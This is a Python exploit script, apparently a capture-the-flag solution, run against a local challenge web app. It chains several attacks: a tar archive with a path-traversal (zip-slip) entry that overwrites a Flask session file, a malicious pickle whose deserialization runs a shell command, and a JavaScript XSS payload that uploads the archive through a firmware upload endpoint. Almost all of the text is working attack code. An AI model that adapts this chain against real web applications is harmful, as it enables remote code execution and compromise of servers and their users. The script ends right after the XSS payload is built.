#!/usr/bin/env python3
import sys, requests, base64, time, tarfile, io, os, pickle, hashlib, struct

hostURL = 'http://127.0.0.1:1337'               # Challenge host URL
userName = f'rh0x01'                            # new username
userPwd = f'rh0x01'                             # new password

def register():
    jData = { 'username': userName, 'password': userPwd }
    req_stat = requests.post(f'{hostURL}/api/register', json=jData).status_code
    if not req_stat == 200:
        print("Something went wrong! Is the challenge host live?")
        sys.exit()

def login():
    jData = { 'username': userName, 'password': userPwd }
    authCookie = requests.post(f'{hostURL}/api/login', json=jData).cookies.get('session')
    if not authCookie:
        print("Something went wrong while logging in!")
        sys.exit()
    return authCookie

def prepare_zipslip(filename):
    class RCE:
        def __reduce__(self):
            cmd = ('/readflag > /app/application/static/flag.txt')
            return os.system, (cmd,)
    pickle_time = struct.pack("I", 0000)
    pickled_payload = pickle_time + pickle.dumps(RCE())

    zipslip = io.BytesIO()
    tar = tarfile.open(fileobj=zipslip, mode='w:gz')
    info = tarfile.TarInfo(f'../../../../../app/flask_session/{filename}')
    info.mtime = time.time()
    info.size = len(pickled_payload)
    tar.addfile(info, io.BytesIO(pickled_payload))
    tar.close()

    return base64.b64encode(zipslip.getvalue()).decode()


print('[+] Signing up a new account..')
register()

print('[~] Logging in to acquire session cookie..')
cookie = login()

print('[+] Preparing zipslip payload file with matching cookie sid..')
sid = 'rayhan0x01'
filename = hashlib.md5(sid.encode()).hexdigest()
b64_file = prepare_zipslip(filename)

print('[+] Preparing the XSS payload to upload the zipslip..')
xss_payload = """
<script>
const b64Data="%s"
const byteCharacters = atob(b64Data);
const byteArrays = [];
const sliceSize=512;
const contentType='multipart/form-data';
for (let offset = 0; offset < byteCharacters.length; offset += sliceSize) {
const slice = byteCharacters.slice(offset, offset + sliceSize);

const byteNumbers = new Array(slice.length);
for (let i = 0; i < slice.length; i++) {
byteNumbers[i] = slice.charCodeAt(i);
}

const byteArray = new Uint8Array(byteNumbers);
byteArrays.push(byteArray);
}

const blob = new Blob(byteArrays, {type: contentType});

var formData = new FormData();
formData.append('file', blob, 'rh0x01.tar.gz');

var xhr = new XMLHttpRequest();
xhr.open('POST','/api/firmware/upload', true);
xhr.send(formData);
</script>
""" % b64_file
